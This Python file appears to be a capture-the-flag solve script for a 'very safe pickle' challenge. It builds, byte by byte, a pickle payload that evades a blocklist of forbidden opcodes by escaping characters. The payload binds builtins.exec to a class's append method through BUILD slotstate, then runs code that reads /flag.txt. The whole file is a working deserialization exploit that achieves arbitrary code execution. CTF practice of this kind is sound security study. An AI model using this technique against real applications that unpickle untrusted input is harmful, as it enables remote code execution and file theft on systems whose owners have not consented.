"""Helper to craft the pickle payload for the very safe pickle challenge."""

from __future__ import annotations

import argparse
import pickle
import sys
from typing import Iterable

FORBIDDEN_BYTES = {0x52, 0x69, 0x6F, 0x81, 0x92}


def needs_escape(ch: str) -> bool:
    return ord(ch) in FORBIDDEN_BYTES or ch == "\\"


def encode_unicode_literal(text: str) -> bytes:
    """Return protocol-0 UNICODE opcode payload for ``text`` with escapes."""
    parts: list[str] = []
    for ch in text:
        if needs_escape(ch):
            parts.append(f"\\u{ord(ch):04x}")
        else:
            parts.append(ch)
    return ("V" + "".join(parts) + "\n").encode("ascii")


def extend_unicode(buf: bytearray, value: str) -> None:
    buf.extend(encode_unicode_literal(value))


def build_payload(
    flag_path: str = "/flag.txt",
    handler_module: str = "__main__",
    handler_name: str = "Handler",
    sink_module: str = "builtins",
    sink_attr: str = "flag",
) -> bytes:
    payload = bytearray()

    payload += b"\x80\x04"  # PROTO 4 keeps compatibility with older runtimes

    extend_unicode(payload, handler_module)
    extend_unicode(payload, handler_name)
    payload += b"\x93"  # STACK_GLOBAL -> Handler

    payload += b"("  # MARK
    payload += b"}"  # state dict (left empty)
    payload += b"}"  # slotstate dict
    extend_unicode(payload, "append")
    extend_unicode(payload, "builtins")
    extend_unicode(payload, "exec")
    payload += b"\x93"  # STACK_GLOBAL -> builtins.exec
    payload += b"s"  # slotstate['append'] = exec
    payload += b"t"  # TUPLE (state, slotstate)
    payload += b"b"  # BUILD (Handler.append = exec via slotstate)

    code = (
        "_=__import__('builtins');"
        "_.flag=_.open('" + flag_path + "').read()"
    )
    extend_unicode(payload, code)
    payload += b"a"  # APPEND (calls exec with code)
    payload += b"0"  # POP Handler

    extend_unicode(payload, sink_module)
    extend_unicode(payload, sink_attr)
    payload += b"\x93"  # STACK_GLOBAL -> builtins.flag

    payload += b"."  # STOP
    return bytes(payload)


def demo_local(flag_path: str, handler_module: str) -> None:
    data = build_payload(flag_path, handler_module=handler_module)
    result = pickle.loads(data)
    print(result)


def main(argv: Iterable[str] | None = None) -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--flag-path", default="/flag.txt")
    parser.add_argument("--handler-module", default="__main__")
    parser.add_argument("--local", action="store_true")
    args = parser.parse_args(list(argv) if argv is not None else None)

    if args.local:
        demo_local(args.flag_path, args.handler_module)
    else:
        sys.stdout.buffer.write(
            build_payload(args.flag_path, handler_module=args.handler_module)
        )


if __name__ == "__main__":
    main()
